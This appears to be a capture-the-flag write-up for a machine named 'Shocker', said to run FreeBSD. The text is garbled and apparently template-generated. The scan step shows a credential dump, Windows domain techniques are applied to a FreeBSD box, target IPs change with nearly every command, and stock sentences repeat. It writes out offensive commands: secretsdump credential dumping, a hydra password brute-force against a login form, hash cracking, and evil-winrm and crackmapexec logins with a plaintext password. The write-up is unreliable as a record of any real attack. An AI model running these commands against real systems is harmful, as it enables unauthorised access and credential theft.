---
TitleSEO: "OffSec Proving Grounds — Shocker (Insane FreeBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Shocker (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Shocker. DCSync and Remote Code Execution to achieve insane compromise on FreeBSD."
Keywords: "pwntilldawn, ctf, reversing, tryhackme, linux"
URL: "https://zurefx.github.io/writeups/htb-shocker-584.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-shocker-584/"
Date: "2025-07-23"
Tags: "PwnTillDawn, CTF, Reversing, TryHackMe, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-shocker-584"
Permalink: "/writeups/htb-shocker-584.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Shocker** is rated **Insane** on OffSec Proving Grounds. It runs **FreeBSD** and the IP address during this analysis was `10.28.20.62`.

### Objectives

The web application was vulnerable to Server-Side Template Injection (SSTI). Initial enumeration revealed several interesting open ports on the target.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.90.143.63
```

Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

### Service Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.94.158.208 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

### SMB Enumeration

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

```bash
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Exploitation

### Vulnerability Identification

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine.

Key finding: **Remote Code Execution**.

The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials.

### Initial Access

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
nmap -sCV -p1433,139,80 10.64.189.190 -oN scan.txt
gobuster dir -u http://10.14.206.26/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Privilege Escalation

### Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.107.174.184
evil-winrm -i 10.19.175.229 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p22,1521,22 10.70.20.129 -oN scan.txt
```

### Exploitation

Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

```powershell
crackmapexec smb 10.26.235.96 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.90.65.144 -u administrator -p 'P@ssw0rd!'
```

The database credentials were hardcoded in the application source code. The target system was identified as running a vulnerable version of the service.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service.

## Summary

### Tools Used

- `hashcat`
- `metasploit`
- `msfvenom`
- `sharphound`
- `netcat`

### Key Takeaways

- DCSync
- Remote Code Execution
